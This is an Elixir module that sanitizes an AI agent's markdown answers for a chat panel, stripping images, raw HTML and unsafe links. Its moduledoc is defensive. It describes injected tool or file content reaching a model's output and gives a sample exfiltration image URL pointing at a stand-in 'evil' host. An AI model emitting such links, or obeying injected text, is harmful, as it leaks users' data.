defmodule PhoenixKitAgent.Web.Markdown do
  @moduledoc """
  The markdown of a model answer as the chat panel shows it (spec §8.2): the
  text a model wrote may carry what a tool result or a file put in it, so the
  page must load nothing because of it.

    * No `<img>`: a picture (`![alt](url)`) is shown as its alt text — an
      outside `src` would send data out without a click
      (`![](https://evil/?d=…)`). The only pictures the panel shows are the
      user's own attachments, through their expiring addresses
      (`PhoenixKitAgent.Attachments.url/3`), never through markdown.
    * No raw HTML: it is shown as text.
    * A link is an `http`/`https` address only (anything else is its text),
      opens in a new tab with `rel="noopener noreferrer nofollow"`, and has
      its domain written beside it, so a text cannot pass for another site.
      Letters beyond ASCII in its path are percent-encoded; a host beyond
      ASCII makes no link, its address is written as text beside the link's
      text. Nothing is fetched for a link (no preview).

  The tree comes from `MDEx.parse_document/2` and is written out here, every
  text escaped; a node this module does not know is shown by its children or
  its text.
  """

  import Phoenix.HTML, only: [html_escape: 1]

  @parse_options [extension: [strikethrough: true, table: true, autolink: true, tasklist: true]]

  @doc "The answer `text` as safe HTML (empty for `nil` or a blank text)."
  @spec to_html(String.t() | nil) :: Phoenix.HTML.safe()
  def to_html(text) when is_binary(text) do
    if String.trim(text) == "" do
      {:safe, []}
    else
      case MDEx.parse_document(text, @parse_options) do
        {:ok, %MDEx.Document{nodes: nodes}} -> {:safe, nodes(nodes)}
        _unparsable -> {:safe, ["<p>", esc(text), "</p>"]}
      end
    end
  end

  def to_html(_nothing), do: {:safe, []}

  # ── blocks ──────────────────────────────────────────────────────────

  defp nodes(nodes), do: Enum.map(nodes, &block/1)

  defp block(%MDEx.Paragraph{nodes: nodes}), do: ["<p>", nodes(nodes), "</p>"]

  defp block(%MDEx.Heading{level: level, nodes: nodes}) do
    tag = if level <= 2, do: "h3", else: "h4"
    ["<", tag, ~s( class="font-semibold mt-2">), nodes(nodes), "</", tag, ">"]
  end

  defp block(%MDEx.BlockQuote{nodes: nodes}),
    do: [
      ~s(<blockquote class="border-l-2 border-base-300 pl-3 opacity-80">),
      nodes(nodes),
      "</blockquote>"
    ]

  defp block(%MDEx.List{list_type: :ordered, nodes: nodes}),
    do: [~s(<ol class="list-decimal pl-5">), nodes(nodes), "</ol>"]

  defp block(%MDEx.List{nodes: nodes}),
    do: [~s(<ul class="list-disc pl-5">), nodes(nodes), "</ul>"]

  defp block(%MDEx.ListItem{nodes: nodes}), do: ["<li>", nodes(nodes), "</li>"]

  defp block(%MDEx.TaskItem{checked: checked, nodes: nodes}),
    do: ["<li>", if(checked, do: "☑ ", else: "☐ "), nodes(nodes), "</li>"]

  defp block(%MDEx.CodeBlock{literal: literal}),
    do: [
      ~s(<pre class="bg-base-200 rounded p-2 overflow-x-auto text-xs"><code>),
      esc(literal),
      "</code></pre>"
    ]

  defp block(%MDEx.ThematicBreak{}), do: ~s(<hr class="my-2 border-base-300" />)

  defp block(%MDEx.Table{nodes: rows}) do
    [
      ~s(<div class="overflow-x-auto"><table class="table table-xs">),
      Enum.map(rows, &row/1),
      "</table></div>"
    ]
  end

  # Raw HTML is the model's text, not markup.
  defp block(%MDEx.HtmlBlock{literal: literal}), do: ["<p>", esc(literal), "</p>"]

  # ── inlines ─────────────────────────────────────────────────────────

  defp block(%MDEx.Text{literal: literal}), do: esc(literal)
  defp block(%MDEx.HtmlInline{literal: literal}), do: esc(literal)
  defp block(%MDEx.Code{literal: literal}), do: ["<code>", esc(literal), "</code>"]
  defp block(%MDEx.SoftBreak{}), do: "\n"
  defp block(%MDEx.LineBreak{}), do: "<br />"
  defp block(%MDEx.Emph{nodes: nodes}), do: ["<em>", nodes(nodes), "</em>"]
  defp block(%MDEx.Strong{nodes: nodes}), do: ["<strong>", nodes(nodes), "</strong>"]
  defp block(%MDEx.Strikethrough{nodes: nodes}), do: ["<del>", nodes(nodes), "</del>"]

  # A picture is its alt text: nothing is loaded for it.
  defp block(%MDEx.Image{nodes: nodes}), do: nodes(nodes)

  defp block(%MDEx.Link{url: url, nodes: nodes}) do
    case link_target(url) do
      {:ok, href, domain} ->
        [
          ~s(<a href="),
          esc(href),
          ~s(" target="_blank" rel="noopener noreferrer nofollow" class="link link-primary">),
          nodes(nodes),
          ~s(</a> <span data-link-domain class="text-xs opacity-60">\(),
          esc(domain),
          ")</span>"
        ]

      {:text, address} ->
        [
          nodes(nodes),
          ~s( <span data-link-address class="text-xs opacity-60 break-all">\(),
          esc(address),
          ")</span>"
        ]

      :error ->
        nodes(nodes)
    end
  end

  # Anything else: its children, else its text, else nothing.
  defp block(%{nodes: nodes}) when is_list(nodes), do: nodes(nodes)
  defp block(%{literal: literal}) when is_binary(literal), do: esc(literal)
  defp block(_other), do: []

  defp row(%MDEx.TableRow{header: header, nodes: cells}) do
    tag = if header, do: "th", else: "td"
    ["<tr>", Enum.map(cells, &["<", tag, ">", nodes(&1.nodes), "</", tag, ">"]), "</tr>"]
  end

  defp row(other), do: block(other)

  # Where a link may go: an `http`/`https` address with an ASCII host. Letters
  # beyond ASCII in the rest of it are percent-encoded. A host beyond ASCII is
  # no link (it could pass for another site, and the browser would show it
  # otherwise than it is written), but its address is kept as text.
  defp link_target(url) when is_binary(url) do
    href = URI.encode(url, &(&1 < 0x80))

    case URI.new(href) do
      {:ok, %URI{scheme: scheme, host: host}}
      when scheme in ["http", "https"] and is_binary(host) and host != "" ->
        if String.contains?(host, "%"),
          do: {:text, url},
          else: {:ok, href, String.downcase(host)}

      _not_a_web_address ->
        :error
    end
  end

  defp link_target(_url), do: :error

  defp esc(text), do: text |> html_escape() |> Phoenix.HTML.safe_to_string()
end
